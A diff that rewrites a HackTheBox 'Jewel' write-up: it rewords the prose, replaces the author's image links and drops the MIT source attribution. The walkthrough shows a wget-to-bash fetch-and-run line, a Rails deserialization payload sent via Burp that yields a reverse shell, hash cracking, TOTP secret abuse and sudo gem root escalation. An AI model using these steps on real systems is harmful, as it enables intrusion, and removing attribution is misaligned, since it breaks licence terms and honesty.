@@ -6,12 +6,8 @@ points: 30
 rating: 3.6
 date: 2020-10-10
 avatar: assets/htb/jewel.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Jewel
 ---
-## Overview
-
-TODO: finish writeup and clean up
 
 ## Useful Skills and Tools
 
@@ -21,13 +17,13 @@ TODO: finish writeup and clean up
 wget -O - -q $url:$port/$file | bash
 ```
 
-* that extra \(`-`\) is important, don't leave it out!
+* don't forget that trailing \(`-`\), it matters!
 
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I kicked things off by running nmap against `<YOUR_IP>`. My usual flags are: `-p-` to cover every port, `-sC` (same as `--script=default`) to fire the default NSE enumeration scripts at the host, `-sV` for service/version detection, and `-oA <name>` to dump the results to files named `<name>`.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/jewel]
@@ -99,43 +95,43 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 141.32 seconds
 ```
 
-My nmap scan found only three open ports: 22 -SSH, 8000 - HTTP, and 8080 - HTTP.
+The scan turned up just three open ports: 22 - SSH, 8000 - HTTP, and 8080 - HTTP.
 
 ### Port 8080 - HTTP
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-bl0g.png)
+![](assets/wu/jewel/img-1.png)
 
-On the site hosted on port 8080 I found a "Bl0g" site.  While looking through the articles I found two potential usernames `bill` and `jennifer`. 
+Port 8080 served a "Bl0g" site. Reading through the posts, I picked out two likely usernames: `bill` and `jennifer`. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-bibo-profile.png)
+![](assets/wu/jewel/img-2.png)
 
-created an account, then logged in. 
+registered an account and logged in. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-edit-user.png)
+![](assets/wu/jewel/img-3.png)
 
-On the profile page saw a 'edit profile' link and was hoping for a image upload box, but there wasn't anything useful as I could only update the username.
+The profile page had an 'edit profile' link. I was hoping for an image upload field, but the only thing I could change was the username.
 
 ### Port 8000 - HTTP
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-git-bl0g.png)
+![](assets/wu/jewel/img-4.png)
 
-On the web server hosted on port 8000 I found a git page for the "Bl0g".
+Port 8000 hosted a gitweb page for the "Bl0g".
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-git-bl0g-tree.png)
+![](assets/wu/jewel/img-5.png)
 
 file tree
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-git-code-rails-ver.png)
+![](assets/wu/jewel/img-6.png)
 
-The file `Gemfile` contained version information for all of the source files for the project, including the version of the Ruby on Rails Framework.
+The `Gemfile` listed version numbers for every dependency in the project, including the Ruby on Rails framework version.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-git-code-hashes.png)
+![](assets/wu/jewel/img-7.png)
 
-in the git code I found a couple of password hashes, in the file bd.sql
+browsing the git source, I spotted a couple of password hashes inside the file bd.sql
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-git-code-hashes2.png)
+![](assets/wu/jewel/img-8.png)
 
-I downloaded the git code for the site by clicking on the `snapshot` link.  I opened the SQL database locally but didn't find anything more that seemed useful in it, or in the rest of the code files.
+I grabbed the site's source by clicking the `snapshot` link. Examining the SQL dump locally turned up nothing else of value, and neither did the rest of the code.
 
 ```text
 COPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin;
@@ -144,27 +140,27 @@ COPY public.users (id, username, email, created_at, updated_at, password_digest)
 +\.
 ```
 
-This also includes email addresses for the users with a domain of `mail.htb`.
+It also exposed the users' email addresses, which use the `mail.htb` domain.
 
-While looking up version numbers for everything, I found an exploit for this version of git, but it looked to only work on Windows.
+As I researched the various version numbers, I came across an exploit for this git version, though it appeared to be Windows-only.
 
 * [https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html](https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html)
 
-Back in the code in the `Gemfile` I had found version numbers for rails 5.2.2.1. After searching for vulnerabilities for this version I found multiple CVEs that were related:
+Back in the `Gemfile` I had noted Rails 5.2.2.1. Searching for vulnerabilities in that release surfaced several relevant CVEs:
 
 * [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8165](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8165)
 * [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8164](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8164)
 * [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5267](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5267)
 
-I tried searching for exploits related to each CVE and came up with a POC for CVE-2020-8165.
+Hunting for exploits against each CVE, I landed on a PoC for CVE-2020-8165.
 
 * [https://www.cvebase.com/cve/2020/8165](https://www.cvebase.com/cve/2020/8165)
 
-On cvebase there were eight POCs listed for this CVE which looked like a winner! I selected the one with the most upvotes which took me to a GitHub page.
+cvebase listed eight PoCs for this CVE, which looked promising. I picked the highest-voted one, which pointed me to a GitHub repo.
 
 * [https://github.com/masahiro331/CVE-2020-8165](https://github.com/masahiro331/CVE-2020-8165)
 
-The instructions looked simple enough to follow, but I did not have rails installed, so I did that first.  Next, I created a new project called `test`. \(Had to change the name to `testing`, since 'test' is apparently a ruby/rails reserved key word.\)
+The steps seemed straightforward, but Rails wasn't installed yet, so I handled that first. Then I spun up a new project called `test`. \(I had to rename it to `testing`, since 'test' turns out to be a reserved keyword in ruby/rails.\)
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/jewel]
@@ -319,13 +315,11 @@ Installing rake
 ...snipped...
 ```
 
-After installing rails and starting my new project I got an error message saying some of the dependencies were not installed, so I had to run the `bundle install` command to install those as well. There was a long list of things it installed. 
+Once Rails was in place and the project was created, I hit errors about missing dependencies, so I ran `bundle install` to pull those in as well. It installed a long list of gems. 
 
-{% hint style="info" %}
-If you get any further errors make sure to read the errors and follow what they say.  Each error should be verbose enough to tell you what needs to be done to resolve the problem.
-{% endhint %}
+If more errors come up, read them carefully and do what they say. They're usually descriptive enough to tell you exactly how to fix the issue.
 
-I had a lot of dependency issues, from yarn, webpacker, rails, and more...
+I ran into plenty of dependency headaches involving yarn, webpacker, rails, and others...
 
 * [https://github.com/rails/webpacker/issues/818](https://github.com/rails/webpacker/issues/818)
 
@@ -355,7 +349,7 @@ found 0 vulnerabilities
 Copying webpack core config
 ```
 
-I had to do the above steps to resolve the webpacker issues I was receiving. For some reason the gem version of yarn was causing problems, so I had to remove it and install it through npm. 
+The steps above cleared up the webpacker problems. The gem-installed yarn was somehow the culprit, so I uninstalled it and reinstalled yarn via npm. 
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/jewel/testing]
@@ -364,7 +358,7 @@ Loading development environment (Rails 6.0.3.5)
 irb(main):001:0>
 ```
 
-After installing all of the dependencies I was able to start the rails console.
+With every dependency sorted out, the rails console finally launched.
 
 ```ruby
 ┌──(kac0㉿kali)-[~/htb/jewel/testing]
@@ -390,15 +384,15 @@ payload=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVaria
 irb(main):011:0>quit()
 ```
 
-After all of that work, it was pretty easy to follow the instructions in the POC to create the payload.  
+After all that setup, generating the payload by following the PoC was straightforward.  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-burp-payload.png)
+![](assets/wu/jewel/img-9.png)
 
-captured request to change the username on the 'edit profile' page in burp, then added my payload in place of the username field
+I intercepted the username-change request from the 'edit profile' page in Burp and swapped my payload into the username field
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-burp-payload-error.png)
+![](assets/wu/jewel/img-10.png)
 
-On the exit profile page, got an error message after sending my payload in place of the username field, but  the payload still executed.
+The edit profile page returned an error after I submitted the payload in the username field, but it executed anyway.
 
 ## Initial Foothold
 
@@ -415,7 +409,7 @@ bash: no job control in this shell
 bill@jewel:~/blog$
 ```
 
-After sending my payload and sending another GET request for the profile page I got a connection back at my waiting netcat listener. I used the program `script` to save a transcript of all commands that I was about to run in the netcat shell, and made sure my listener was running in bash rather than `zsh`, since the latter causes issues when setting `stty raw -echo` when upgrading shells.
+Once the payload was sent and I issued another GET request for the profile page, my waiting netcat listener caught a connection. I used `script` to record a transcript of everything I was about to run in the shell, and I ran the listener under bash instead of `zsh`, because `zsh` misbehaves with `stty raw -echo` during shell upgrades.
 
 ```text
 bill@jewel:~/blog$ which python3
@@ -432,7 +426,7 @@ bill@jewel:~/blog$ export TERM=xterm-256color
 bill@jewel:~/blog$
 ```
 
-Upgraded my shell so I could use `ctrl-c`, arrow keys for history, etc.
+I upgraded the shell to regain `ctrl-c`, command history via the arrow keys, and so on.
 
 ```text
 bill@jewel:~$ id && hostname
@@ -440,7 +434,7 @@ uid=1000(bill) gid=1000(bill) groups=1000(bill)
 jewel.htb
 ```
 
-I was logged in a bill, no special groups
+I was running as bill, with no notable group memberships
 
 ```text
 bill@jewel:~/blog$ cd /home
@@ -466,7 +460,7 @@ lrwxrwxrwx  1 bill bill    9 Aug 27 11:26 .rediscli_history -> /dev/null
 -rw-r--r--  1 bill bill  116 Aug 26 10:43 .yarnrc
 ```
 
-There was a few interesting hidden files in `bill`'s home folder, including one called `.google_authenticator`.
+`bill`'s home directory held a few interesting hidden files, notably `.google_authenticator`.
 
 ### User.txt
 
@@ -475,7 +469,7 @@ bill@jewel:~$ cat user.txt
 9688************************83b2
 ```
 
-I was happy to see that `bill` had the `user.txt` flag in his home directory!
+Nice to see the `user.txt` flag sitting right in `bill`'s home directory!
 
 ## Path to Power \(Gaining Administrator Access\)
 
@@ -487,11 +481,11 @@ I was happy to see that `bill` had the `user.txt` flag in his home directory!
 /home/bill/blog/bd.sql:$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW
 ```
 
-linpeas pointed out that there were a couple of files with password hashes. The second one was one that I had tried to crack unsuccessfully before, but the other was new. Since it was in a backups folder, it was possible that this was an old password that was used elsewhere
+linpeas flagged a couple of files containing password hashes. The second was the one I'd already failed to crack, but the first was new to me. Living in a backups folder, it could well be an old password reused somewhere else
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-db-backup.png)
+![](assets/wu/jewel/img-11.png)
 
-I copied the backup SQL file to my local machine and opened it up. There were a couple of new hashes in it, which I loaded into hashcat to try to crack.
+I transferred the backup SQL file to my box and opened it. It held a couple of new hashes, which I fed into hashcat to crack.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/jewel]
@@ -544,7 +538,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 spongebob        (?)
 ```
 
-For some reason hashcat could not identify the backup hashes as a valid bcrypt hash, but `john` was able to crack one of them almost immediately.
+hashcat refused to recognize the backup hashes as valid bcrypt for some reason, but `john` cracked one of them almost instantly.
 
 ```text
 bill@jewel:/var/backups$ cat /etc/passwd
@@ -580,7 +574,7 @@ postgres:x:108:115:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
 redis:x:109:116::/var/lib/redis:/usr/sbin/nologin
 ```
 
-I checked `/etc/passwd` to see if there were any other users, but only `bill`, `postgres`, and `root` could log in.
+Checking `/etc/passwd` for other accounts, I saw that only `bill`, `postgres`, and `root` had login shells.
 
 ```text
 bill@jewel:/var/backups$ sudo -l
@@ -593,7 +587,7 @@ I fart in your general direction!
 sudo: 3 incorrect password attempts
 ```
 
-It password ended up belonging to `bill`.  I tried using `sudo -l` again now that I had a password, but it asked for a verification code. This seemed like it may have been related to the `.google-authenticator` file I saw in `bill`'s home folder.
+That password turned out to be `bill`'s. With the password in hand I tried `sudo -l` again, but now it prompted for a verification code, almost certainly tied to the `.google-authenticator` file in `bill`'s home folder.
 
 * [https://github.com/google/google-authenticator-libpam](https://github.com/google/google-authenticator-libpam)
 
@@ -642,7 +636,7 @@ Verification code:
 sudo: 3 incorrect password attempts
 ```
 
-I was unable to setup a new google authenticator \(and somebody likes monty Python...\)
+I couldn't set up a fresh google authenticator \(and clearly somebody is a Monty Python fan...\)
 
 ```text
 bill@jewel:~$ cat .google_authenticator 
@@ -655,7 +649,7 @@ bill@jewel:~$ cat .google_authenticator
 
 > The easiest way to generate codes is with oath-tool. It is available in the oath-toolkit package, and can be used as follows: `oathtool --totp -b ABC123` Where ABC123 is the secret key.
 
-After installing `oathtool` and trying to generate totp using the code I had found, I noticed that the machine's time was GMT, and my system was not. This was causing my attempts to verify the OTP to fail.
+I installed `oathtool` and tried generating a TOTP from the secret I'd found, but my OTP kept being rejected; I realized the box was on GMT while my system wasn't.
 
 ```text
 bill@jewel:~$ sudo -l
@@ -669,7 +663,7 @@ Error "Operation not permitted" while writing config
 This man, he doesn't know when he's beaten! He doesn't know when he's winning, either. He has no... sort of... sensory apparatus...
 ```
 
-After setting my system to GMT I got a different sort of error. The time between the two machines was still off by a few minutes, which may have been still causing problems. I searched for ways to sync the times between the two machines
+Switching my system to GMT produced a different error. The two clocks were still a few minutes apart, which was probably still tripping me up, so I looked for a way to sync the times between them
 
 * [https://superuser.com/questions/577495/how-can-i-sync-date-time-in-two-computers](https://superuser.com/questions/577495/how-can-i-sync-date-time-in-two-computers)
 
@@ -679,9 +673,9 @@ After setting my system to GMT I got a different sort of error. The time between
 date: invalid date ‘Mon 15 Feb 00:51:59 GMT 2021’
 ```
 
-Unfortunately it seems not only are the time zones different, but the format of the date/time was different which made it so I couldn't sync automatically by using SSH.
+Unfortunately, not only did the time zones differ, the date/time format did too, so I couldn't sync automatically over SSH.
 
-After playing around with matching the times, I realized that the time zone, and date were wrong.
+After fiddling with matching the times, I realized both the time zone and the date were off.
 
 * [https://unix.stackexchange.com/questions/110522/timezone-setting-in-linux](https://unix.stackexchange.com/questions/110522/timezone-setting-in-linux)
 
@@ -712,7 +706,7 @@ Mon 15 Feb 2021 12:00:00 AM GMT
 Mon 15 Feb 2021 02:29:15 AM GMT
 ```
 
-After getting the time synced, I was able to check the results of `sudo -l` finally:
+With the clocks finally aligned, I could at last see the output of `sudo -l`:
 
 ```text
 bill@jewel:~$ sudo -l
@@ -726,7 +720,7 @@ User bill may run the following commands on jewel:
     (ALL : ALL) /usr/bin/gem
 ```
 
-After all of that trouble getting the OTP, I was glad to see there was a result!  Next, I searched for a way to do privilege escalation using `sudo gem` and found a post on GTFObins on how to do this.
+After all the OTP hassle, it was great to actually get a result! I then looked up how to escalate privileges via `sudo gem` and found the technique on GTFObins.
 
 * [https://gtfobins.github.io/gtfobins/gem/](https://gtfobins.github.io/gtfobins/gem/)
 
@@ -741,14 +735,14 @@ uid=0(root) gid=0(root) groups=0(root)
 jewel.htb
 ```
 
-I ran the command from GTFObins with `sudo` and it immediately gave me a root shell.  It seemed to me that if I had been able to read the sudoers file I could have bypassed all of that trouble with OTPs. I wasn't sure why one wasn't required to run the command, unless I was still authenticated. I logged back out to test this.
+Running the GTFObins command under `sudo` dropped me straight into a root shell. It occurred to me that being able to read the sudoers file earlier would have spared me all the OTP pain. I wasn't sure why no code was demanded this time, unless I was still within an authenticated window, so I logged out to check.
 
 ```text
 bill@jewel:~$ less /etc/sudoers
 /etc/sudoers: Permission denied
 ```
 
-I had forgotten to check this file earlier, but I was somewhat relieved that all of the pain that it took to sync the date and time wasn't in vain.
+I'd forgotten to check this file before, but I was a bit relieved that all the effort syncing the date and time hadn't been wasted.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/jewel]
@@ -766,7 +760,7 @@ uid=0(root) gid=0(root) groups=0(root)
 #
 ```
 
-I was correct. There was a window in which I was able to enter commands with `sudo` without re-authenticating.
+I was right. There's a grace window during which `sudo` lets you run commands without re-authenticating.
 
 ### Root.txt
 
